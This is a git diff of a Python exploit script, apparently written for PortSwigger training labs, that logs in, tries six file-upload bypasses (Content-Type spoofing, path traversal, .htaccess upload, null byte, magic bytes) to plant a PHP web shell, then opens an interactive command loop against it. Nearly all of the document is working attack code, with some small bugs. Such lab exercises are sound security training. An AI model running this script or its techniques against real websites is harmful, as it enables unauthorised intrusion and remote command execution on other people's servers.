@@ -21,6 +21,7 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # session = requests.Session()
+
 dotenv.load_dotenv()
 
 
@@ -32,19 +33,32 @@ class PortSwiggerExploit:
         self.session = requests.Session()
 
     def csrf_token_extract(self, url):
-        url_get = self.session.get(url).text
-        csrf = re.search(r'name="csrf" value="([^"]+)"', url_get).group(1)
-        if csrf:
+        try:
+            url_get = self.session.get(url).text
+            csrf = re.search(r'name="csrf" value="([^"]+)"', url_get).group(1)
+            if not csrf:
+                raise print(f"CSRF was not found. You might have to check the website (ᵕ—ᴗ—)")
             return csrf
-        return None
-    
-    def file_upload(self, csrf, additional_stuff=None, path_traversal=False, obsfucated_extension=False, magic_byte=False):
+        except requests.exceptions.RequestException as e:
+            print(f"RequestError: {e}")
+            return None
+        except ValueError as e: 
+            print(f"Unexpected error: {e}")
+            return None
+        
+    def file_upload(self, csrf, content_type=None, path_traversal=False, obsfucated_extension=False, magic_byte=False):
         if magic_byte:
             self.file_location = os.getenv('MAGIC_BYTE_FILE')
         else:
             self.file_location = os.getenv('FILE_TO_UPLOAD')
+        if not self.file_location:
+            print(f"The file to be uploaded is not set in the environment. Be sure to set the environment correctly. ദ്ദി ˉ͈̀꒳ˉ͈́ )✧")
+            return None
+        if not os.path.exists(self.file_location):
+            print(f"The file doesn't exist. Common you can do better, I trust in you. ᕙ(  •̀ ᗜ •́  )ᕗ")
+            return None
         self.file_name = Path(self.file_location).name
-        file = ""
+
         if path_traversal:
             file = "..%2f" + self.file_name
         elif obsfucated_extension:
@@ -56,32 +70,57 @@ class PortSwiggerExploit:
             'csrf': csrf,
             'user':'wiener'
         }
-        files = {
-            "avatar": (file, open(self.file_location, "rb"), additional_stuff)
-        }
+        try:
+            with open(self.file_location, "rb") as f: 
+                files = {
+                    "avatar": (file, f, content_type)
+                }
 
+                file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=files, verify=False)
+            if file_upload_post.status_code != 200:
+                print(f"{file_upload_post.status_code}: Payload containing file was not uploaded.")
 
-        file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=files, verify=False)
-        return file_upload_post.status_code
+            return file_upload_post.status_code
+        except requests.exceptions.RequestException as e:
+            print(f"RequestError: {e}")
+            return None
+        except FileNotFoundError as e:
+            print(f"File was not found. Check if file is readable ;-)")
     
     def exploit(self, status_code, path_traversal=False):
-        if status_code == 200:
-            if path_traversal:
-                exploit_url = f"{self.url}/files/{self.file_name}"
-            else:
-                exploit_url = f"{self.url}/files/avatars/{self.file_name}"
-            if payload_injection.start_payload(exploit_url, "whoami")  == None: #testing if exploit works
-                return False
-            print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
-            while True:
-                payload = input("Enter your payload: ") 
-                if payload == "stop":
+        if status_code != 200:
+            return False
+        if path_traversal:
+            exploit_url = f"{self.url}/files/{self.file_name}"
+        else:
+            exploit_url = f"{self.url}/files/avatars/{self.file_name}"
+        if payload_injection.start_payload(exploit_url, "whoami")  is None: #testing if exploit works
+            print("Web shell verification failed")
+            return False
+        
+        print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
+        while True:
+            try:
+                payload = input("shell> ").strip()
+                if not payload:
+                    continue 
+                if payload.lower() in ["stop", "exit", "quit"]:
+                    print("Exiting shell.....")
                     break
+
                 file_upload_web_shell =  payload_injection.start_payload(exploit_url, payload)
                 print(file_upload_web_shell)
-            return True
-        else:
-            return False
+                        
+            except KeyboardInterrupt:
+                print("\n\nKeyBoard Interuption. Exiting shell...")
+                break
+            except EOFError:
+                print("\nExiting shell...")
+                break
+            except Exception as e:
+                print(f"Error: {e}")
+        return True
+      
 
     def simple_file_upload(self):
         print("Trying simple file upload")
@@ -104,34 +143,49 @@ class PortSwiggerExploit:
     def blacklist_bypass(self):
         print("Trying to bypass blacklist")
         csrf = self.csrf_token_extract(f"{self.url}/my-account")
-        htaccess = {
-                "avatar": (".htaccess", open(os.getenv('HTACCESS_FILE'), "rb"))
-        }
-        file = {
-            "avatar": ("web_shell.php2", open(os.getenv('FILE_TO_UPLOAD'), "rb"))
-        }
         data={
             'csrf': csrf,
             'user':'wiener'
         }
-        htaccess_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=htaccess, verify=False)
-        if htaccess_upload_post.status_code != 200:
-            return False
-        
-        file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=file, verify=False)
-        if file_upload_post.status_code != 200:
-            return False
+        try:
+            with open(os.getenv("HTACCESS_FILE", "rb")) as f:
+                htaccess = {
+                    "avatar": (".htaccess", f)
+                    }
+                htaccess_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=htaccess, verify=False)
+            with open(os.getenv("FILE_TO_UPLOAD"), "rb") as f:
+                file = {
+                    "avatar": ("web_shell.php2", f)
+                }
+                file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=file, verify=False)
+            if htaccess_upload_post.status_code != 200 or file_upload_post.status_code != 200:
+                print(f"{file_upload_post.status_code}: Payload containing file was not upload.")
+
+        except requests.exceptions.RequestException as e:
+            print(f"RequestError: {e}")
+            return None
+        except FileNotFoundError as e:
+            print(f"File was not found. Check if file is readable ;-)") 
         
         exploit_url = f"{url}/files/avatars/web_shell.php2"
-        if payload_injection.start_payload(exploit_url, "whoami")  == None:
+        if payload_injection.start_payload(exploit_url, "whoami")  is None:
                 return False
         print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
         while True:
-            payload = input("Enter your payload: ") 
-            if payload == "stop":
+            try:
+                payload = input("shell> ").strip() 
+                if payload.lower() in ["stop", "exit", "quit"]:
+                    break
+                file_upload_web_shell =  payload_injection.start_payload(exploit_url, payload)
+                print(file_upload_web_shell)
+            except KeyboardInterrupt:
+                print("\n\nKeyBoard Interuption. Exiting shell...")
                 break
-            file_upload_web_shell =  payload_injection.start_payload(exploit_url, payload)
-            print(file_upload_web_shell)
+            except EOFError:
+                print("\nExiting shell...")
+                break
+            except Exception as e:
+                print(f"Error: {e}")
         return True
     
     def null_byte_injection(self):
@@ -149,32 +203,43 @@ class PortSwiggerExploit:
         
     def login(self):
         csrf_token = self.csrf_token_extract(f"{self.url}/login")
-        if csrf_token != None:
-            login_info = {
-                "username": "wiener", #credentials given in website
-                "password": "peter", #credentials given in website
-                "csrf": csrf_token 
-            }
+        if csrf_token is None:
+            print(f"CSRF was not found. You might have to check the website (ᵕ—ᴗ—)")
+        login_info = {
+            "username": "wiener", #credentials given in website
+            "password": "peter", #credentials given in website
+            "csrf": csrf_token 
+        }
+        try:
             self.login_page_post = self.session.post(url=f"{self.url}/login", verify=False, data=login_info, allow_redirects=True)
-            if self.login_page_post.status_code == 200:
-                if self.simple_file_upload():
-                    pass
-                elif self.content_type_file_upload():
-                    pass
-                elif self.path_traversal():
-                    pass
-                elif self.blacklist_bypass():
-                    pass
-                elif self.null_byte_injection():
-                    pass
-                elif self.magic_byte_file_upload():
-                    pass
-                else:
-                    print("Bye bye ˙◠˙")
 
-            else: print("Oops something went wrong ")
-        else:
-            print("csrf token not found -_-")
+        except requests.exceptions.Timeout:
+            print("Error: Request timed out")
+            return False
+        
+        except requests.exceptions.RequestException as e:
+            print(f"Error: Network request failed - {e}")
+        
+        exploit_methods = [
+        ("Simple file upload", self.simple_file_upload),
+        ("Content-Type bypass", self.content_type_file_upload),
+        ("Path traversal", self.path_traversal),
+        ("Blacklist bypass", self.blacklist_bypass),
+        ("Null byte injection", self.null_byte_injection),
+        ("Magic byte upload", self.magic_byte_file_upload)
+        ]
+
+        for method_name, method in exploit_methods:
+            try:
+                if method():
+                    print(f"Success with {method_name}")
+                    print("Bye bye ˙◠˙")
+                    return True
+            except Exception as e:
+                print(f"{method_name} failed: {e}")
+                continue
+        print("All exploits failed. Sorry you will have to search for better programmer than me. (╥﹏╥)")
+        return False
 
 url = input("Enter the link to exploit: ")
 start = PortSwiggerExploit(url)
